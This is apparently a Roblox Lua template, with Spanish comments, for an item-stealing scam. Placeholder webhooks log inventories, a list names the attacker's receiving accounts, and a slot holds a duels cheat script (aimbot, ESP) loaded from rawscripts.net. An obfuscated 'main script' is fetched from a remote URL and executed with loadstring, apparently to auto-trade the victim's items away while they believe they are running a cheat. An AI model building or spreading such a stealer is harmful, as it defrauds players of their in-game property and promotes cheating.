-- ==========================================
-- CONFIGURACIÓN PERSONALIZABLE
-- ==========================================
getgenv().AutoTradeConfig = {
    WebhookLogs = "TU_WEBHOOK_LOGS_AQUI",
    WebhookInventario = "TU_WEBHOOK_INVENTARIO_AQUI",
    

-- cambia jugador 1,2,3.... por el user de tus cuentas que van a recibir las cosas.  
    JugadoresObjetivos = {
        "Jugador1", 
        "Jugador2",
        "Jugador3"
    }
}

-- ==========================================
-- SCRIPT DE DUELOS (PVP)
-- ==========================================
-- Pega tu script de duelos que gustes aquí debajo (PUEDES ENCONTRARLOS EN scriptblox.com)
task.spawn(function()
    -- ex: loadstring(game:HttpGet("https://rawscripts.net/raw/DUELS-Murderers-VS-Sheriffs-BEST-SCRIPT-SILENT-AIM-AIMBOT-ESP-RAGEBOT-AND-ALOT-MORE-227237"))()
end)

-- ==========================================
-- CARGA DEL SCRIPT PRINCIPAL OFUSCADO
-- ==========================================
local rawUrl = "ENLACE_DE_TU_SCRIPT_AQUI"
loadstring(game:HttpGet(rawUrl))()